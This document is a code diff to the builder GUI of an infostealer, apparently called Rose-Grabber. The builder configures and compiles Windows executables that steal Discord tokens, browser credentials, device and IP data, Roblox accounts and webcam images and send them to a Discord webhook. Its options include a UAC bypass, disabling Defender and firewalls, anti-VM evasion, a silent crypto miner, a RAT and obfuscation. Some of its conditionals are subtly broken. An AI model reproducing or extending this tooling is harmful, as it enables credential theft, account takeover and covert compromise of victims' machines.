@@ -7,6 +7,8 @@ if sys.executable.endswith('pythonw.exe'):
 from flaskwebgui import FlaskUI
 from nicegui import ui, app
 import requests
+import tkinter as tk
+from tkinter import filedialog
 
 from dhooks import Webhook, Embed 
 import os 
@@ -47,11 +49,11 @@ logger = logging.getLogger(__name__)
 gumbobr0ts_wallet_adr = "MY WALLET ADRESS HERE"
 
 __title__ = 'Rose UI Builder'
-__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/$rose-b.png'
-__version__ = '1.5'
+__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/$rose-b.png'
+__version__ = '1.6'
 __debugm__ = False # Change only if you are a dev 
-__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/$rose-wh.png"
-__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
+__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/$rose-wh.png"
+__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
 
 data_builder = {
     "webhook_url": "",
@@ -60,10 +62,9 @@ data_builder = {
     "use_scr": False,
     "injection": False,
     "token": False,
-    "cookie": False,
-    "password": False,
-    "malicious": False,
-    "location": False,
+    "browser": False,
+    "deviceinf": False,
+    "ipinf": False,
     "roblox": False,
     "rose_rat": False,
     "rose_rat_url": "",
@@ -80,15 +81,16 @@ data_builder = {
     "nitro_buy": False,
     "file_pumper": False,
     "file_pumper_size": "",
-    "get_admin": False,
+    "uac_bypass": False,
     "disable_defender": False,
     "disable_firewalls": False,
-    "vm_detect": False,
-    "vm_webhook_url": "",
+    "antivm": False,
+    "antivm_webhook_url": "",
     "webcam": False,
     "icon_file": "",
     "obfuscation": False,
-    "type_file": ""
+    "type_file": "",
+    "icon_path": ""
 }
 
 links = {
@@ -97,7 +99,7 @@ links = {
     "gumbobr0t_github": "https://github.com/gumbobr0t",
     "suegdu_github": "https://github.com/suegdu",
     "svn_github": "https://github.com/suvan1911",
-    "rose_github": "https://github.com/DamagingRose/Rose-Injector",
+    "rose_github": "https://github.com/DamagingRose/Rose-Grabber",
     "rose_discord": "https://discord.gg/Ts9RTFYvyt"
 }
 
@@ -112,7 +114,7 @@ def auto_update():
         return 
     
     _code = (
-            "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/roseui/v8.pyw"
+            "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/v8.pyw"
     )
     
     code = requests.get(_code, timeout=10).text
@@ -124,11 +126,11 @@ def auto_update():
             f = ctypes.windll.user32.MessageBoxW(
                 0, 
                 f"A new version has been detected.\nWould you like to download the new version?\nCurrent version: {str(__version__)} | New version {str(version)}",
-                "Rose Injector",
+                "Rose-Grabber",
                 4
             )
             if f == 6:
-                webbrowser.open("https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip")
+                webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip")
                 os._exit(0)
 
 def change_data(key, value):
@@ -154,21 +156,21 @@ async def test_webhook(webhook_url):
                 timestamp="now"
             )
             embed.set_author(name="Success", icon_url=__icon__)
-            embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
+            embed.set_footer(text="Rose Builder | By pierro, suegdu, gumbobr0t, svn", icon_url=__icon__)
             await hook.send(embed=embed)
         return 0
     except Exception as e:
         logger.error(f"WebHook failed to execute - Link: {webhook_url} - Error: {e}")
-        return 1  
+        return 1
 
 def _makebuild(q: Queue, data_builder) -> str:
     logger.info("Entered _makebuild")
     logger.info("data_builder: " + str(data_builder))
     if data_builder["webhook_url"] == "":
-        ui.notify("WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+        ui.notify("Webhook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
-    if data_builder["vm_detect"] and data_builder["vm_webhook_url"] == "":
-            ui.notify("VM Detection WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+    if data_builder["antivm"] == "":
+            ui.notify("Anti-VM Webhook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
             return
     if data_builder["build_name"] == "":
         ui.notify("Build Name is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
@@ -180,9 +182,9 @@ def _makebuild(q: Queue, data_builder) -> str:
         ui.notify("Knight-RAT Bot Token is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
     
-    if data_builder["icon_file"] == "":
+    if data_builder["icon_file"] == "EXE" or "":
         basic_exe_path = os.getcwd() + 'assets\imageres-011.ico'
-        data_builder["icon_file"] = basic_exe_path.replace('roseui', '')
+        data_builder["icon_path"] = basic_exe_path.replace('roseui', '')
 
     if data_builder["wallet_adress"] == "":
         data_builder["wallet_adress"] = gumbobr0ts_wallet_adr
@@ -193,8 +195,8 @@ def _makebuild(q: Queue, data_builder) -> str:
     if data_builder["rose_rat_url"] == "":
         data_builder["rose_rat_url"] = ".rat"
         
-    if data_builder['vm_webhook_url'] == "":
-        data_builder['vm_webhook_url'] = data_builder['webhook_url']
+    if data_builder['antivm_webhook_url'] == "":
+        data_builder['antivm_webhook_url'] = data_builder['webhook_url']
 
     ui.notify("Build has been started!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
         
@@ -210,6 +212,7 @@ def _makebuild(q: Queue, data_builder) -> str:
 
     def get_files():
         try:
+            logging.debug("Entered get_files")
             cwd = os.getcwd()
             ncwd = cwd.replace('roseui', 'source')
             for file in os.listdir(ncwd):
@@ -233,15 +236,14 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("KNIGHT_DISCORD_RAT_PREFIX", f"{data_builder['knight_prefix']}") \
                 .replace("start_up = False", f"start_up = {data_builder['startup']}") \
                 .replace("injection = False", f"injection = {data_builder['injection']}") \
+                .replace("browser_stealing = False", f"browser_stealing = {data_builder['browser']}") \
                 .replace("token_stealing = False", f"token_stealing = {data_builder['token']}") \
-                .replace("cookie_stealing = False", f"cookie_stealing = {data_builder['cookie']}") \
-                .replace("password_stealing = False", f"password_stealing = {data_builder['password']}") \
-                .replace("malicious_stealing = False", f"malicious_stealing = {data_builder['malicious']}") \
-                .replace("location_stealing = False", f"location_stealing = {data_builder['location']}") \
+                .replace("deviceinf_stealing = False", f"deviceinf_stealing = {data_builder['deviceinf']}") \
+                .replace("ipinf_stealing = False", f"ipinf_stealing = {data_builder['ipinf']}") \
                 .replace("roblox_stealing = False", f"roblox_stealing = {data_builder['roblox']}") \
                 .replace("screenshot = False", f"screenshot = {data_builder['screenshot']}") \
                 .replace("discord_ping = False", f"discord_ping = {data_builder['ping']}") \
-                .replace("get_admin = False", f"get_admin = {data_builder['get_admin']}") \
+                .replace("uac_bypass = False", f"uac_bypass = {data_builder['uac_bypass']}") \
                 .replace("silent_crypto_miner = False", f"{data_builder['silent_crypto_miner']}") \
                 .replace("use_scr = False", f"use_scr = {data_builder['use_scr']}") \
                 .replace("_WALLET_ADR_HERE", f"{data_builder['wallet_adress']}") \
@@ -249,8 +251,8 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("disable_firewalls = False", f"disable_firewalls = {data_builder['disable_firewalls']}") \
                 .replace("fake_error = False", f"fake_error = {data_builder['fake_error']}") \
                 .replace("nitro_auto_buy = False", f"nitro_auto_buy = {data_builder['nitro_buy']}") \
-                .replace("vmdetection = False", f"vmdetection = {data_builder['vm_detect']}") \
-                .replace("VMHOOK", f"{data_builder['vm_webhook_url']}") \
+                .replace("antivm = False", f"antivm = {data_builder['antivm']}") \
+                .replace("ANTIVMHOOK", f"{data_builder['antivm_webhook_url']}") \
                 .replace("webcam = False", f"webcam = {data_builder['webcam']}")
                  # noqa: E501
                 
@@ -293,7 +295,7 @@ def _makebuild(q: Queue, data_builder) -> str:
 
         def create_obfuscated_file(input_filename):
             obfuscated_code = generate_obfuscated_code(input_filename)
-            backup_dir = 'backup'
+            backup_dir = data_builder['build_name'] + '_backup'
 
             if not os.path.exists(backup_dir):
                 os.makedirs(backup_dir)
@@ -340,10 +342,10 @@ def _makebuild(q: Queue, data_builder) -> str:
     def compile():
         try:
             logger.info("Entering compile process")
-            logger.info(f'Compile CMD Line: python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_file"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile')
+            logger.info(f'Compile CMD Line: python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_path"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile')
             output_file = "rosecompile.log"
             subprocess.call(
-                f'python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_file"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile',
+                f'python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_path"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile',
                 shell=True,
                 stdout=open(output_file, 'w'),
                 stderr=subprocess.STDOUT
@@ -352,16 +354,20 @@ def _makebuild(q: Queue, data_builder) -> str:
         except Exception as e:
             logger.error(f"Error in compile: {e}")
 
-    def move_dir():
-        logger.info("Entering move_dir")
+    def cleanup():
+        logger.info("Entering cleanup")
+
+        backup_dir = data_builder['build_name'] + '_backup'
         try:
             shutil.move("dist\\main.exe", f"{data_builder['build_name']}.exe")
             shutil.rmtree('build')
             shutil.rmtree('dist')
             shutil.rmtree(data_builder['build_name'])
             os.remove("main.spec")
+            if os.path.exists(backup_dir) and os.path.isdir(backup_dir):
+                shutil.rmtree(backup_dir)
         except Exception as e:
-            logger.error(f"Error in move_dir: {e}")
+            logger.error(f"Error in cleanup: {e}")
             
     def assign_extension():
         old_exe_path = os.getcwd() + f'\{data_builder["build_name"]}.exe'
@@ -379,13 +385,24 @@ def _makebuild(q: Queue, data_builder) -> str:
     q.put_nowait(0.4)
     compile()
     q.put_nowait(0.6)
-    move_dir()
+    cleanup()
     q.put_nowait(0.7)
     pump_file()
     q.put_nowait(0.9)
     assign_extension()
     q.put_nowait(1)
     return 'Done!'
+
+def select_icon():
+    root = tk.Tk()
+    root.withdraw()
+
+    file_path = filedialog.askopenfilename(filetypes=[("ICO Files", "*.ico")])
+    
+    if file_path:
+        change_data("icon_path", file_path)
+    
+    root.destroy()
 
 def _home():
     with ui.dialog() as dialog, ui.card():
@@ -406,8 +423,7 @@ def _home():
         
     queue = Manager().Queue()
     ui.timer(0.1, callback=lambda: progressbar.set_value(queue.get() if not queue.empty() else progressbar.value))
-      
-      
+
     with ui.column():
         ui.input(
             label='WebHook URL',
@@ -419,15 +435,18 @@ def _home():
             placeholder='Rose on top baby',
             on_change=lambda e: change_data("build_name", e.value)
         ).props('inline color=pink-3').classes('w-full')
-        ui.input(
+
+        ui.select(
             label='File icon',
-            placeholder='Specify the exact .ico path, leave blank for basic',
+            options=['EXE', 'CUSTOM'],
             on_change=lambda e: change_data("icon_file", e.value)
         ).props('inline color=pink-3').classes('w-full')
+
+        ui.button('Select Custom Icon', on_click=select_icon)
+
         ui.select(
             label='File type',
             options=["Executable", "Screensaver"],
-            value="Executable",
             on_change=lambda e: change_data('type_file', e.value)
         ).props("color=pink-3").classes('w-full')
         ui.checkbox('Obfuscate src files', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=pink-3')  
@@ -456,31 +475,27 @@ def _functions():
                 ui.checkbox('Use scr file', on_change=lambda e: change_data('use_scr', e.value)).bind_visibility_from(_startup, 'value').props('inline color=pink')  
             with ui.row():
                 _inj = ui.checkbox(
-                    'Injector',
+                    'Injection',
                     on_change=lambda e: change_data('injection', e.value)
                 ).props('inline color=pink')
                 ui.checkbox(
-                    'Nitro Auto Buy',
+                    'Buy Nitro',
                     on_change=lambda e: change_data('nitro_buy', e.value)
                 ).bind_visibility_from(_inj, 'value').props('inline color=pink')  
                 
-            with ui.row():
-                _admin = ui.checkbox('Get admin / Admin only', on_change=lambda e: change_data('get_admin', e.value)).props('inline color=pink')
-                ui.checkbox('Disable Windows Defender', on_change=lambda e: change_data('disable_defender', e.value)).props('inline color=black-2').bind_visibility_from(_admin, 'value').props('inline color=pink')
-                ui.checkbox('Disable Windows Firewalls', on_change=lambda e: change_data('disable_firewalls', e.value)).props('inline color=black-2').bind_visibility_from(_admin, 'value').props('inline color=pink')
+            ui.checkbox('UAC Bypass', on_change=lambda e: change_data('uac_bypass', e.value)).props('inline color=pink')
 
         with ui.expansion('Grabber', icon='work').classes('w-full'):
             with ui.row():
                 with ui.column():
                     ui.checkbox('Token', on_change=lambda e: change_data('token', e.value)).props('inline color=green')
-                    ui.checkbox('Cookie', on_change=lambda e: change_data('cookie', e.value)).props('inline color=green')
-                    ui.checkbox('Password', on_change=lambda e: change_data('password', e.value)).props('inline color=green')
+                    ui.checkbox('Browser Credentials', on_change=lambda e: change_data('browser', e.value)).props('inline color=green')
                     ui.checkbox('Screenshot', on_change=lambda e: change_data('screenshot', e.value)).props('inline color=green')
                     ui.checkbox('Webcam', on_change=lambda e: change_data('webcam', e.value)).props('inline color=green')
                     
                 with ui.column():
-                    ui.checkbox('Malicious', on_change=lambda e: change_data('malicious', e.value)).props('inline color=green')
-                    ui.checkbox('Location', on_change=lambda e: change_data('location', e.value)).props('inline color=green')
+                    ui.checkbox('Device Information', on_change=lambda e: change_data('deviceinf', e.value)).props('inline color=green')
+                    ui.checkbox('IP & Wi-Fi Data', on_change=lambda e: change_data('ipinf', e.value)).props('inline color=green')
                     ui.checkbox('Roblox', on_change=lambda e: change_data('roblox', e.value)).props('inline color=green')
 
         with ui.expansion('Advanced', icon='work').classes('w-full'):
@@ -509,10 +524,7 @@ def _functions():
                         on_change=lambda e: change_data('knight_prefix', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                 ui.checkbox('Ping', on_change=lambda e: change_data('ping', e.value)).props('inline color=yellow-7')
                 ui.checkbox('Fake Error', on_change=lambda e: change_data('fake_error', e.value)).props('inline color=yellow-7')
-                with ui.row():
-                    _vm = ui.checkbox('VM Detect', on_change=lambda e: change_data('vm_detect', e.value)).props('inline color=yellow-7')
-                    ui.input(label='VM Detection WebHook URL', placeholder='Rose on top baby',
-                        on_change=lambda e: change_data('vm_webhook_url', e.value)).bind_visibility_from(_vm, 'value').props('inline color=yellow-7')
+                ui.checkbox('Anti-VM', on_change=lambda e: change_data('antivm', e.value)).props('inline color=yellow-7')
 
 
 def _github():
@@ -555,7 +567,7 @@ ui.colors(primary='#333')
 
 @ui.page('/home')
 def superhome():
-    ui.image('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/RoseWBG.png').style(
+    ui.image('https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/%24rose-wh.png').style(
         'position: absolute; top: 3px; left: 575px; width: 90px;'
         )        
 
@@ -574,7 +586,7 @@ def superhome():
         with ui.tab_panel('Socials'):
             _github()
 
-v = ui.video('https://github.com/DamagingRose/Rose-Injector/raw/main/components/assets/RoseLoadingScreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
+v = ui.video('https://github.com/DamagingRose/Rose-Grabber/raw/main/components/assets/RoseLoadingScreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
 v.on('ended', lambda _: ui.open('/home'))
 app.on_shutdown(pool.shutdown)
 
